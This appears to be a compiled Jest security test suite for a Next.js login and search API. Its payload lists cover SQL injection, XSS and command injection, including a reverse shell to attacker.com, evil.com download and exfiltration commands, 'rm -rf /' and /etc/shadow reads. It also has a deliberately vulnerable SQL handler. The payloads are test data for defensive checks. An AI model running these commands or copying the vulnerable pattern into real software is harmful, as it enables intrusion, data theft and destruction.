47c6f1fac313454ad02a42af2b3e032e
"use strict";
Object.defineProperty(exports, "__esModule", {
    value: true
});
const _globals = require("@jest/globals");
const _server = require("next/server");
const _jsonwebtoken = /*#__PURE__*/ _interop_require_default(require("jsonwebtoken"));
const _bcryptjs = /*#__PURE__*/ _interop_require_default(require("bcryptjs"));
function _interop_require_default(obj) {
    return obj && obj.__esModule ? obj : {
        default: obj
    };
}
// Helper function to create mock NextRequest
const createMockNextRequest = (url, options = {})=>{
    const { method = "GET", body, headers = {} } = options;
    return {
        method,
        url,
        headers: new Headers(headers),
        json: async ()=>body ? typeof body === "string" ? JSON.parse(body) : body : {},
        text: async ()=>body ? typeof body === "string" ? body : JSON.stringify(body) : ""
    };
};
// Security test utilities
class SecurityTestUtils {
    static generateSQLInjectionPayloads() {
        return [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'password'); --",
            "' OR 1=1 --",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "' OR 1=1#"
        ];
    }
    static generateXSSPayloads() {
        return [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>"
        ];
    }
    static generateCommandInjectionPayloads() {
        return [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "; cat /etc/shadow",
            "| nc -l 4444",
            "; wget http://evil.com/malware",
            "&& curl http://evil.com/steal-data",
            "; python -c 'import os; os.system(\"rm -rf /\")'",
            "| bash -i >& /dev/tcp/attacker.com/8080 0>&1",
            "; /bin/bash"
        ];
    }
    static generateLongStrings() {
        return [
            "A".repeat(1000),
            "A".repeat(10000),
            "A".repeat(100000),
            "\0".repeat(1000),
            "\n".repeat(1000),
            "\r".repeat(1000)
        ];
    }
    static generateInvalidTokens() {
        return [
            "invalid.token.here",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
            "",
            "Bearer",
            "null",
            "undefined",
            "{}",
            "admin",
            "../../etc/passwd",
            '<script>alert("xss")</script>'
        ];
    }
    static async hashPassword(password) {
        return _bcryptjs.default.hash(password, 10);
    }
    static generateValidJWT(payload, secret = "test-secret") {
        return _jsonwebtoken.default.sign(payload, secret, {
            expiresIn: "1h"
        });
    }
    static generateExpiredJWT(payload, secret = "test-secret") {
        return _jsonwebtoken.default.sign(payload, secret, {
            expiresIn: "-1h"
        });
    }
}
// Mock API handlers for security testing
const mockPrisma = {
    user: {
        findUnique: jest.fn(),
        findMany: jest.fn(),
        create: jest.fn(),
        update: jest.fn()
    },
    product: {
        findMany: jest.fn(),
        create: jest.fn()
    },
    $queryRaw: jest.fn(),
    $executeRaw: jest.fn()
};
// Mock vulnerable endpoint for testing
const vulnerableSearchHandler = async (req)=>{
    const url = new URL(req.url);
    const query = url.searchParams.get("q");
    if (!query) {
        return _server.NextResponse.json({
            error: "Query required"
        }, {
            status: 400
        });
    }
    // Simulate SQL injection vulnerability (for testing purposes)
    try {
        // This would be vulnerable in real code - DON'T DO THIS
        const results = await mockPrisma.$queryRaw`
      SELECT * FROM products WHERE name LIKE '%${query}%'
    `;
        return _server.NextResponse.json({
            results
        });
    } catch (error) {
        return _server.NextResponse.json({
            error: "Database error"
        }, {
            status: 500
        });
    }
};
// Secure search handler for comparison
const secureSearchHandler = async (req)=>{
    const url = new URL(req.url);
    const query = url.searchParams.get("q");
    if (!query) {
        return _server.NextResponse.json({
            error: "Query required"
        }, {
            status: 400
        });
    }
    // Input validation
    if (query.length > 100) {
        return _server.NextResponse.json({
            error: "Query too long"
        }, {
            status: 400
        });
    }
    // Sanitize input
    const sanitizedQuery = query.replace(/[<>"'&]/g, "");
    try {
        // Use parameterized queries
        const results = await mockPrisma.product.findMany({
            where: {
                name: {
                    contains: sanitizedQuery,
                    mode: "insensitive"
                }
            }
        });
        return _server.NextResponse.json({
            results
        });
    } catch (error) {
        return _server.NextResponse.json({
            error: "Database error"
        }, {
            status: 500
        });
    }
};
// Authentication handler with security measures
const secureAuthHandler = async (req)=>{
    const body = await req.json();
    const { email, password } = body;
    // Rate limiting simulation
    const clientIP = req.headers.get("x-forwarded-for") || "unknown";
    // Input validation
    if (!email || !password) {
        return _server.NextResponse.json({
            error: "Email and password are required"
        }, {
            status: 400
        });
    }
    if (email.length > 254 || password.length > 128) {
        return _server.NextResponse.json({
            error: "Input too long"
        }, {
            status: 400
        });
    }
    // Email format validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        return _server.NextResponse.json({
            error: "Invalid email format"
        }, {
            status: 400
        });
    }
    // Check for suspicious patterns
    const suspiciousPatterns = [
        /<script/i,
        /javascript:/i,
        /on\w+=/i,
        /\bor\b.*\b1\s*=\s*1\b/i,
        /union.*select/i,
        /drop.*table/i
    ];
    const isSuspicious = suspiciousPatterns.some((pattern)=>pattern.test(email) || pattern.test(password));
    if (isSuspicious) {
        return _server.NextResponse.json({
            error: "Invalid input detected"
        }, {
            status: 400
        });
    }
    try {
        const user = await mockPrisma.user.findUnique({
            where: {
                email
            }
        });
        if (!user) {
            // Constant time delay to prevent timing attacks
            await new Promise((resolve)=>setTimeout(resolve, 100));
            return _server.NextResponse.json({
                error: "Invalid credentials"
            }, {
                status: 401
            });
        }
        const isValid = await _bcryptjs.default.compare(password, user.password);
        if (!isValid) {
            return _server.NextResponse.json({
                error: "Invalid credentials"
            }, {
                status: 401
            });
        }
        // Generate secure token
        const token = _jsonwebtoken.default.sign({
            userId: user.id,
            email: user.email,
            iat: Math.floor(Date.now() / 1000)
        }, process.env.JWT_SECRET || "test-secret", {
            expiresIn: "15m",
            issuer: "md-sports",
            audience: "md-sports-client"
        });
        return _server.NextResponse.json({
            user: {
                id: user.id,
                email: user.email,
                name: user.name
            },
            token
        });
    } catch (error) {
        return _server.NextResponse.json({
            error: "Internal server error"
        }, {
            status: 500
        });
    }
};
(0, _globals.describe)("Security Tests", ()=>{
    (0, _globals.beforeAll)(()=>{
        process.env.JWT_SECRET = "test-secret-key-for-security-testing";
    });
    (0, _globals.beforeEach)(()=>{
        jest.clearAllMocks();
    });
    (0, _globals.describe)("SQL Injection Protection", ()=>{
        (0, _globals.it)("should prevent SQL injection in search queries", async ()=>{
            const sqlPayloads = SecurityTestUtils.generateSQLInjectionPayloads();
            for (const payload of sqlPayloads){
                const request = createMockNextRequest(`http://localhost:3000/api/search?q=${encodeURIComponent(payload)}`);
                // Test with secure handler
                const response = await secureSearchHandler(request);
                // Should not return 500 error or expose database structure
                (0, _globals.expect)(response.status).not.toBe(500);
                const data = await response.json();
                (0, _globals.expect)(data).not.toHaveProperty("results");
            }
        });
        (0, _globals.it)("should use parameterized queries", async ()=>{
            mockPrisma.product.findMany.mockResolvedValue([]);
            const request = createMockNextRequest("http://localhost:3000/api/search?q=test' OR '1'='1");
            await secureSearchHandler(request);
            // Verify parameterized query was used
            (0, _globals.expect)(mockPrisma.product.findMany).toHaveBeenCalledWith({
                where: {
                    name: {
                        contains: "test OR 11",
                        mode: "insensitive"
                    }
                }
            });
        });
    });
    (0, _globals.describe)("XSS Protection", ()=>{
        (0, _globals.it)("should sanitize XSS payloads in input", async ()=>{
            const xssPayloads = SecurityTestUtils.generateXSSPayloads();
            for (const payload of xssPayloads){
                const request = createMockNextRequest(`http://localhost:3000/api/search?q=${encodeURIComponent(payload)}`);
                const response = await secureSearchHandler(request);
                const data = await response.json();
                // Should not contain script tags or javascript
                if (data.results) {
                    const responseStr = JSON.stringify(data);
                    (0, _globals.expect)(responseStr).not.toMatch(/<script/i);
                    (0, _globals.expect)(responseStr).not.toMatch(/javascript:/i);
                    (0, _globals.expect)(responseStr).not.toMatch(/on\w+=/i);
                }
            }
        });
        (0, _globals.it)("should reject suspicious input patterns", async ()=>{
            const request = createMockNextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: {
                    email: '<script>alert("xss")</script>@test.com',
                    password: "password123"
                },
                headers: {
                    "Content-Type": "application/json"
                }
            });
            const response = await secureAuthHandler(request);
            const data = await response.json();
            (0, _globals.expect)(response.status).toBe(400);
            (0, _globals.expect)(data.error).toBe("Invalid input detected");
        });
    });
    (0, _globals.describe)("Authentication Security", ()=>{
        (0, _globals.it)("should reject invalid JWT tokens", async ()=>{
            const invalidTokens = SecurityTestUtils.generateInvalidTokens();
            for (const token of invalidTokens){
                (0, _globals.expect)(()=>{
                    _jsonwebtoken.default.verify(token, process.env.JWT_SECRET);
                }).toThrow();
            }
        });
        (0, _globals.it)("should reject expired tokens", async ()=>{
            const expiredToken = SecurityTestUtils.generateExpiredJWT({
                userId: 1,
                email: "test@example.com"
            });
            (0, _globals.expect)(()=>{
                _jsonwebtoken.default.verify(expiredToken, process.env.JWT_SECRET);
            }).toThrow("jwt expired");
        });
        (0, _globals.it)("should use secure password hashing", async ()=>{
            const password = "testpassword123";
            const hash = await SecurityTestUtils.hashPassword(password);
            // Should be bcrypt hash
            (0, _globals.expect)(hash).toMatch(/^\$2[aby]\$\d+\$/);
            // Should not be the original password
            (0, _globals.expect)(hash).not.toBe(password);
            // Should verify correctly
            const isValid = await _bcryptjs.default.compare(password, hash);
            (0, _globals.expect)(isValid).toBe(true);
            // Should not verify with wrong password
            const isInvalid = await _bcryptjs.default.compare("wrongpassword", hash);
            (0, _globals.expect)(isInvalid).toBe(false);
        });
        (0, _globals.it)("should prevent timing attacks in authentication", async ()=>{
            const validEmail = "test@example.com";
            const invalidEmail = "nonexistent@example.com";
            // Mock user lookup
            mockPrisma.user.findUnique.mockImplementation(({ where })=>{
                if (where.email === validEmail) {
                    return Promise.resolve({
                        id: 1,
                        email: validEmail,
                        password: "$2a$10$hashedPassword",
                        name: "Test User"
                    });
                }
                return Promise.resolve(null);
            });
            const validRequest = createMockNextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: {
                    email: validEmail,
                    password: "wrongpassword"
                },
                headers: {
                    "Content-Type": "application/json"
                }
            });
            const invalidRequest = createMockNextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: {
                    email: invalidEmail,
                    password: "wrongpassword"
                },
                headers: {
                    "Content-Type": "application/json"
                }
            });
            // Measure response times
            const start1 = Date.now();
            const response1 = await secureAuthHandler(validRequest);
            const time1 = Date.now() - start1;
            const start2 = Date.now();
            const response2 = await secureAuthHandler(invalidRequest);
            const time2 = Date.now() - start2;
            // Both should return 401
            (0, _globals.expect)(response1.status).toBe(401);
            (0, _globals.expect)(response2.status).toBe(401);
            // Response times should be similar (within 50ms)
            (0, _globals.expect)(Math.abs(time1 - time2)).toBeLessThan(50);
        });
    });
    (0, _globals.describe)("Input Validation", ()=>{
        (0, _globals.it)("should reject oversized inputs", async ()=>{
            const longStrings = SecurityTestUtils.generateLongStrings();
            for (const longString of longStrings){
                const request = createMockNextRequest("http://localhost:3000/api/auth/login", {
                    method: "POST",
                    body: {
                        email: longString,
                        password: "password123"
                    },
                    headers: {
                        "Content-Type": "application/json"
                    }
                });
                const response = await secureAuthHandler(request);
                (0, _globals.expect)(response.status).toBe(400);
            }
        });
        (0, _globals.it)("should validate email format", async ()=>{
            const invalidEmails = [
                "invalid-email",
                "@domain.com",
                "user@",
                "user..name@domain.com",
                "user@domain",
                "",
                "user name@domain.com"
            ];
            for (const email of invalidEmails){
                const request = createMockNextRequest("http://localhost:3000/api/auth/login", {
                    method: "POST",
                    body: {
                        email,
                        password: "password123"
                    },
                    headers: {
                        "Content-Type": "application/json"
                    }
                });
                const response = await secureAuthHandler(request);
                const data = await response.json();
                (0, _globals.expect)(response.status).toBe(400);
                (0, _globals.expect)(data.error).toBe("Invalid email format");
            }
        });
        (0, _globals.it)("should handle null bytes and special characters", async ()=>{
            const maliciousInputs = [
                "test\0@example.com",
                "test\r\n@example.com",
                "test	@example.com",
                "test\b@example.com"
            ];
            for (const input of maliciousInputs){
                const request = createMockNextRequest("http://localhost:3000/api/auth/login", {
                    method: "POST",
                    body: {
                        email: input,
                        password: "password123"
                    },
                    headers: {
                        "Content-Type": "application/json"
                    }
                });
                const response = await secureAuthHandler(request);
                (0, _globals.expect)(response.status).toBe(400);
            }
        });
    });
    (0, _globals.describe)("Command Injection Protection", ()=>{
        (0, _globals.it)("should prevent command injection in file operations", ()=>{
            const commandPayloads = SecurityTestUtils.generateCommandInjectionPayloads();
            for (const payload of commandPayloads){
                // Simulate file name validation
                const isValidFileName = (filename)=>{
                    // Only allow alphanumeric, dots, hyphens, and underscores
                    return /^[a-zA-Z0-9._-]+$/.test(filename);
                };
                (0, _globals.expect)(isValidFileName(payload)).toBe(false);
            }
        });
    });
    (0, _globals.describe)("JWT Security", ()=>{
        (0, _globals.it)("should use secure JWT configuration", ()=>{
            const payload = {
                userId: 1,
                email: "test@example.com"
            };
            const token = SecurityTestUtils.generateValidJWT(payload);
            const decoded = _jsonwebtoken.default.verify(token, process.env.JWT_SECRET);
            (0, _globals.expect)(decoded.userId).toBe(1);
            (0, _globals.expect)(decoded.email).toBe("test@example.com");
            (0, _globals.expect)(decoded.iat).toBeDefined();
            (0, _globals.expect)(decoded.exp).toBeDefined();
        });
        (0, _globals.it)("should not accept tokens with none algorithm", ()=>{
            // Create a token with 'none' algorithm (security vulnerability)
            const header = Buffer.from(JSON.stringify({
                alg: "none",
                typ: "JWT"
            })).toString("base64url");
            const payload = Buffer.from(JSON.stringify({
                userId: 1,
                email: "test@example.com"
            })).toString("base64url");
            const noneToken = `${header}.${payload}.`;
            (0, _globals.expect)(()=>{
                _jsonwebtoken.default.verify(noneToken, process.env.JWT_SECRET);
            }).toThrow();
        });
        (0, _globals.it)("should validate token signature", ()=>{
            const validToken = SecurityTestUtils.generateValidJWT({
                userId: 1
            });
            const [header, payload] = validToken.split(".");
            const tamperedToken = `${header}.${payload}.tampered_signature`;
            (0, _globals.expect)(()=>{
                _jsonwebtoken.default.verify(tamperedToken, process.env.JWT_SECRET);
            }).toThrow("invalid signature");
        });
    });
    (0, _globals.describe)("Rate Limiting Simulation", ()=>{
        (0, _globals.it)("should handle rapid successive requests", async ()=>{
            const requests = Array.from({
                length: 100
            }, ()=>createMockNextRequest("http://localhost:3000/api/auth/login", {
                    method: "POST",
                    body: {
                        email: "test@example.com",
                        password: "password123"
                    },
                    headers: {
                        "Content-Type": "application/json",
                        "X-Forwarded-For": "192.168.1.100"
                    }
                }));
            // In a real implementation, this would trigger rate limiting
            const responses = await Promise.all(requests.map((req)=>secureAuthHandler(req)));
            // All requests should be processed (in real app, some would be rate limited)
            responses.forEach((response)=>{
                (0, _globals.expect)([
                    400,
                    401,
                    429
                ]).toContain(response.status); // 429 = Too Many Requests
            });
        });
    });
    (0, _globals.describe)("Error Handling Security", ()=>{
        (0, _globals.it)("should not expose sensitive information in error messages", async ()=>{
            // Simulate database error
            mockPrisma.user.findUnique.mockRejectedValue(new Error('Connection failed to database "md_sports" on host "localhost"'));
            const request = createMockNextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: {
                    email: "test@example.com",
                    password: "password123"
                },
                headers: {
                    "Content-Type": "application/json"
                }
            });
            const response = await secureAuthHandler(request);
            const data = await response.json();
            (0, _globals.expect)(response.status).toBe(500);
            (0, _globals.expect)(data.error).toBe("Internal server error");
            (0, _globals.expect)(data.error).not.toContain("database");
            (0, _globals.expect)(data.error).not.toContain("localhost");
            (0, _globals.expect)(data.error).not.toContain("md_sports");
        });
        (0, _globals.it)("should use generic error messages for authentication failures", async ()=>{
            mockPrisma.user.findUnique.mockResolvedValue(null);
            const request = createMockNextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: {
                    email: "nonexistent@example.com",
                    password: "password123"
                },
                headers: {
                    "Content-Type": "application/json"
                }
            });
            const response = await secureAuthHandler(request);
            const data = await response.json();
            (0, _globals.expect)(response.status).toBe(401);
            (0, _globals.expect)(data.error).toBe("Invalid credentials");
            (0, _globals.expect)(data.error).not.toContain("user not found");
            (0, _globals.expect)(data.error).not.toContain("email");
        });
    });
});

//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy9zYWNoaW4vRG9jdW1lbnRzL21kLXNwb3J0cy0vdGVzdHMvc2VjdXJpdHkvc2VjdXJpdHkudGVzdC50cyJdLCJzb3VyY2VzQ29udGVudCI6WyJpbXBvcnQgeyBkZXNjcmliZSwgaXQsIGV4cGVjdCwgYmVmb3JlQWxsLCBhZnRlckFsbCwgYmVmb3JlRWFjaCB9IGZyb20gJ0BqZXN0L2dsb2JhbHMnO1xuaW1wb3J0IHsgTmV4dFJlc3BvbnNlIH0gZnJvbSAnbmV4dC9zZXJ2ZXInO1xuaW1wb3J0IGp3dCBmcm9tICdqc29ud2VidG9rZW4nO1xuaW1wb3J0IGJjcnlwdCBmcm9tICdiY3J5cHRqcyc7XG5pbXBvcnQgY3J5cHRvIGZyb20gJ2NyeXB0byc7XG5cbi8vIEhlbHBlciBmdW5jdGlvbiB0byBjcmVhdGUgbW9jayBOZXh0UmVxdWVzdFxuY29uc3QgY3JlYXRlTW9ja05leHRSZXF1ZXN0ID0gKHVybDogc3RyaW5nLCBvcHRpb25zOiB7XG4gIG1ldGhvZD86IHN0cmluZztcbiAgYm9keT86IGFueTtcbiAgaGVhZGVycz86IFJlY29yZDxzdHJpbmcsIHN0cmluZz47XG59ID0ge30pOiBhbnkgPT4ge1xuICBjb25zdCB7IG1ldGhvZCA9ICdHRVQnLCBib2R5LCBoZWFkZXJzID0ge30gfSA9IG9wdGlvbnM7XG4gIHJldHVybiB7XG4gICAgbWV0aG9kLFxuICAgIHVybCxcbiAgICBoZWFkZXJzOiBuZXcgSGVhZGVycyhoZWFkZXJzKSxcbiAgICBqc29uOiBhc3luYyAoKSA9PiBib2R5ID8gKHR5cGVvZiBib2R5ID09PSAnc3RyaW5nJyA/IEpTT04ucGFyc2UoYm9keSkgOiBib2R5KSA6IHt9LFxuICAgIHRleHQ6IGFzeW5jICgpID0+IGJvZHkgPyAodHlwZW9mIGJvZHkgPT09ICdzdHJpbmcnID8gYm9keSA6IEpTT04uc3RyaW5naWZ5KGJvZHkpKSA6ICcnLFxuICB9O1xufTtcblxuLy8gU2VjdXJpdHkgdGVzdCB1dGlsaXRpZXNcbmNsYXNzIFNlY3VyaXR5VGVzdFV0aWxzIHtcbiAgc3RhdGljIGdlbmVyYXRlU1FMSW5qZWN0aW9uUGF5bG9hZHMoKTogc3RyaW5nW10ge1xuICAgIHJldHVybiBbXG4gICAgICBcIic7IERST1AgVEFCTEUgdXNlcnM7IC0tXCIsXG4gICAgICBcIicgT1IgJzEnPScxXCIsXG4gICAgICBcIicgVU5JT04gU0VMRUNUICogRlJPTSB1c2VycyAtLVwiLFxuICAgICAgXCInOyBJTlNFUlQgSU5UTyB1c2VycyAoZW1haWwsIHBhc3N3b3JkKSBWQUxVRVMgKCdoYWNrZXJAZXZpbC5jb20nLCAncGFzc3dvcmQnKTsgLS1cIixcbiAgICAgIFwiJyBPUiAxPTEgLS1cIixcbiAgICAgIFwiYWRtaW4nLS1cIixcbiAgICAgIFwiYWRtaW4nLypcIixcbiAgICAgIFwiJyBPUiAneCc9J3hcIixcbiAgICAgIFwiJykgT1IgKCcxJz0nMVwiLFxuICAgICAgXCInIE9SIDE9MSNcIixcbiAgICBdO1xuICB9XG5cbiAgc3RhdGljIGdlbmVyYXRlWFNTUGF5bG9hZHMoKTogc3RyaW5nW10ge1xuICAgIHJldHVybiBbXG4gICAgICBcIjxzY3JpcHQ+YWxlcnQoJ1hTUycpPC9zY3JpcHQ+XCIsXG4gICAgICBcImphdmFzY3JpcHQ6YWxlcnQoJ1hTUycpXCIsXG4gICAgICBcIjxpbWcgc3JjPXggb25lcnJvcj1hbGVydCgnWFNTJyk+XCIsXG4gICAgICBcIjxzdmcgb25sb2FkPWFsZXJ0KCdYU1MnKT5cIixcbiAgICAgIFwiPGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgnWFNTJyk+PC9pZnJhbWU+XCIsXG4gICAgICBcIjxib2R5IG9ubG9hZD1hbGVydCgnWFNTJyk+XCIsXG4gICAgICBcIjxpbnB1dCBvbmZvY3VzPWFsZXJ0KCdYU1MnKSBhdXRvZm9jdXM+XCIsXG4gICAgICBcIjxzZWxlY3Qgb25mb2N1cz1hbGVydCgnWFNTJykgYXV0b2ZvY3VzPlwiLFxuICAgICAgXCI8dGV4dGFyZWEgb25mb2N1cz1hbGVydCgnWFNTJykgYXV0b2ZvY3VzPlwiLFxuICAgICAgXCI8a2V5Z2VuIG9uZm9jdXM9YWxlcnQoJ1hTUycpIGF1dG9mb2N1cz5cIixcbiAgICBdO1xuICB9XG5cbiAgc3RhdGljIGdlbmVyYXRlQ29tbWFuZEluamVjdGlvblBheWxvYWRzKCk6IHN0cmluZ1tdIHtcbiAgICByZXR1cm4gW1xuICAgICAgXCI7IGxzIC1sYVwiLFxuICAgICAgXCJ8IGNhdCAvZXRjL3Bhc3N3ZFwiLFxuICAgICAgXCImJiBybSAtcmYgL1wiLFxuICAgICAgXCI7IGNhdCAvZXRjL3NoYWRvd1wiLFxuICAgICAgXCJ8IG5jIC1sIDQ0NDRcIixcbiAgICAgIFwiOyB3Z2V0IGh0dHA6Ly9ldmlsLmNvbS9tYWx3YXJlXCIsXG4gICAgICBcIiYmIGN1cmwgaHR0cDovL2V2aWwuY29tL3N0ZWFsLWRhdGFcIixcbiAgICAgIFwiOyBweXRob24gLWMgJ2ltcG9ydCBvczsgb3Muc3lzdGVtKFxcXCJybSAtcmYgL1xcXCIpJ1wiLFxuICAgICAgXCJ8IGJhc2ggLWkgPiYgL2Rldi90Y3AvYXR0YWNrZXIuY29tLzgwODAgMD4mMVwiLFxuICAgICAgXCI7IC9iaW4vYmFzaFwiLFxuICAgIF07XG4gIH1cblxuICBzdGF0aWMgZ2VuZXJhdGVMb25nU3RyaW5ncygpOiBzdHJpbmdbXSB7XG4gICAgcmV0dXJuIFtcbiAgICAgICdBJy5yZXBlYXQoMTAwMCksXG4gICAgICAnQScucmVwZWF0KDEwMDAwKSxcbiAgICAgICdBJy5yZXBlYXQoMTAwMDAwKSxcbiAgICAgICdcXHgwMCcucmVwZWF0KDEwMDApLCAvLyBOdWxsIGJ5dGVzXG4gICAgICAnXFxuJy5yZXBlYXQoMTAwMCksIC8vIE5ld2xpbmVzXG4gICAgICAnXFxyJy5yZXBlYXQoMTAwMCksIC8vIENhcnJpYWdlIHJldHVybnNcbiAgICBdO1xuICB9XG5cbiAgc3RhdGljIGdlbmVyYXRlSW52YWxpZFRva2VucygpOiBzdHJpbmdbXSB7XG4gICAgcmV0dXJuIFtcbiAgICAgICdpbnZhbGlkLnRva2VuLmhlcmUnLFxuICAgICAgJ2V5SmhiR2NpT2lKSVV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5pbnZhbGlkLnNpZ25hdHVyZScsXG4gICAgICAnJywgLy8gRW1wdHkgdG9rZW5cbiAgICAgICdCZWFyZXInLCAvLyBKdXN0IEJlYXJlclxuICAgICAgJ251bGwnLFxuICAgICAgJ3VuZGVmaW5lZCcsXG4gICAgICAne30nLFxuICAgICAgJ2FkbWluJyxcbiAgICAgICcuLi8uLi9ldGMvcGFzc3dkJyxcbiAgICAgICc8c2NyaXB0PmFsZXJ0KFwieHNzXCIpPC9zY3JpcHQ+JyxcbiAgICBdO1xuICB9XG5cbiAgc3RhdGljIGFzeW5jIGhhc2hQYXNzd29yZChwYXNzd29yZDogc3RyaW5nKTogUHJvbWlzZTxzdHJpbmc+IHtcbiAgICByZXR1cm4gYmNyeXB0Lmhhc2gocGFzc3dvcmQsIDEwKTtcbiAgfVxuXG4gIHN0YXRpYyBnZW5lcmF0ZVZhbGlkSldUKHBheWxvYWQ6IGFueSwgc2VjcmV0OiBzdHJpbmcgPSAndGVzdC1zZWNyZXQnKTogc3RyaW5nIHtcbiAgICByZXR1cm4gand0LnNpZ24ocGF5bG9hZCwgc2VjcmV0LCB7IGV4cGlyZXNJbjogJzFoJyB9KTtcbiAgfVxuXG4gIHN0YXRpYyBnZW5lcmF0ZUV4cGlyZWRKV1QocGF5bG9hZDogYW55LCBzZWNyZXQ6IHN0cmluZyA9ICd0ZXN0LXNlY3JldCcpOiBzdHJpbmcge1xuICAgIHJldHVybiBqd3Quc2lnbihwYXlsb2FkLCBzZWNyZXQsIHsgZXhwaXJlc0luOiAnLTFoJyB9KTtcbiAgfVxufVxuXG4vLyBNb2NrIEFQSSBoYW5kbGVycyBmb3Igc2VjdXJpdHkgdGVzdGluZ1xuY29uc3QgbW9ja1ByaXNtYSA9IHtcbiAgdXNlcjoge1xuICAgIGZpbmRVbmlxdWU6IGplc3QuZm4oKSxcbiAgICBmaW5kTWFueTogamVzdC5mbigpLFxuICAgIGNyZWF0ZTogamVzdC5mbigpLFxuICAgIHVwZGF0ZTogamVzdC5mbigpLFxuICB9LFxuICBwcm9kdWN0OiB7XG4gICAgZmluZE1hbnk6IGplc3QuZm4oKSxcbiAgICBjcmVhdGU6IGplc3QuZm4oKSxcbiAgfSxcbiAgJHF1ZXJ5UmF3OiBqZXN0LmZuKCksXG4gICRleGVjdXRlUmF3OiBqZXN0LmZuKCksXG59O1xuXG4vLyBNb2NrIHZ1bG5lcmFibGUgZW5kcG9pbnQgZm9yIHRlc3RpbmdcbmNvbnN0IHZ1bG5lcmFibGVTZWFyY2hIYW5kbGVyID0gYXN5bmMgKHJlcTogTmV4dFJlcXVlc3QpID0+IHtcbiAgY29uc3QgdXJsID0gbmV3IFVSTChyZXEudXJsKTtcbiAgY29uc3QgcXVlcnkgPSB1cmwuc2VhcmNoUGFyYW1zLmdldCgncScpO1xuICBcbiAgaWYgKCFxdWVyeSkge1xuICAgIHJldHVybiBOZXh0UmVzcG9uc2UuanNvbih7IGVycm9yOiAnUXVlcnkgcmVxdWlyZWQnIH0sIHsgc3RhdHVzOiA0MDAgfSk7XG4gIH1cblxuICAvLyBTaW11bGF0ZSBTUUwgaW5qZWN0aW9uIHZ1bG5lcmFiaWxpdHkgKGZvciB0ZXN0aW5nIHB1cnBvc2VzKVxuICB0cnkge1xuICAgIC8vIFRoaXMgd291bGQgYmUgdnVsbmVyYWJsZSBpbiByZWFsIGNvZGUgLSBET04nVCBETyBUSElTXG4gICAgY29uc3QgcmVzdWx0cyA9IGF3YWl0IG1vY2tQcmlzbWEuJHF1ZXJ5UmF3YFxuICAgICAgU0VMRUNUICogRlJPTSBwcm9kdWN0cyBXSEVSRSBuYW1lIExJS0UgJyUke3F1ZXJ5fSUnXG4gICAgYDtcbiAgICBcbiAgICByZXR1cm4gTmV4dFJlc3BvbnNlLmpzb24oeyByZXN1bHRzIH0pO1xuICB9IGNhdGNoIChlcnJvcikge1xuICAgIHJldHVybiBOZXh0UmVzcG9uc2UuanNvbih7IGVycm9yOiAnRGF0YWJhc2UgZXJyb3InIH0sIHsgc3RhdHVzOiA1MDAgfSk7XG4gIH1cbn07XG5cbi8vIFNlY3VyZSBzZWFyY2ggaGFuZGxlciBmb3IgY29tcGFyaXNvblxuY29uc3Qgc2VjdXJlU2VhcmNoSGFuZGxlciA9IGFzeW5jIChyZXE6IE5leHRSZXF1ZXN0KSA9PiB7XG4gIGNvbnN0IHVybCA9IG5ldyBVUkwocmVxLnVybCk7XG4gIGNvbnN0IHF1ZXJ5ID0gdXJsLnNlYXJjaFBhcmFtcy5nZXQoJ3EnKTtcbiAgXG4gIGlmICghcXVlcnkpIHtcbiAgICByZXR1cm4gTmV4dFJlc3BvbnNlLmpzb24oeyBlcnJvcjogJ1F1ZXJ5IHJlcXVpcmVkJyB9LCB7IHN0YXR1czogNDAwIH0pO1xuICB9XG5cbiAgLy8gSW5wdXQgdmFsaWRhdGlvblxuICBpZiAocXVlcnkubGVuZ3RoID4gMTAwKSB7XG4gICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKHsgZXJyb3I6ICdRdWVyeSB0b28gbG9uZycgfSwgeyBzdGF0dXM6IDQwMCB9KTtcbiAgfVxuXG4gIC8vIFNhbml0aXplIGlucHV0XG4gIGNvbnN0IHNhbml0aXplZFF1ZXJ5ID0gcXVlcnkucmVwbGFjZSgvWzw+XCInJl0vZywgJycpO1xuICBcbiAgdHJ5IHtcbiAgICAvLyBVc2UgcGFyYW1ldGVyaXplZCBxdWVyaWVzXG4gICAgY29uc3QgcmVzdWx0cyA9IGF3YWl0IG1vY2tQcmlzbWEucHJvZHVjdC5maW5kTWFueSh7XG4gICAgICB3aGVyZToge1xuICAgICAgICBuYW1lOiB7XG4gICAgICAgICAgY29udGFpbnM6IHNhbml0aXplZFF1ZXJ5LFxuICAgICAgICAgIG1vZGU6ICdpbnNlbnNpdGl2ZScsXG4gICAgICAgIH0sXG4gICAgICB9LFxuICAgIH0pO1xuICAgIFxuICAgIHJldHVybiBOZXh0UmVzcG9uc2UuanNvbih7IHJlc3VsdHMgfSk7XG4gIH0gY2F0Y2ggKGVycm9yKSB7XG4gICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKHsgZXJyb3I6ICdEYXRhYmFzZSBlcnJvcicgfSwgeyBzdGF0dXM6IDUwMCB9KTtcbiAgfVxufTtcblxuLy8gQXV0aGVudGljYXRpb24gaGFuZGxlciB3aXRoIHNlY3VyaXR5IG1lYXN1cmVzXG5jb25zdCBzZWN1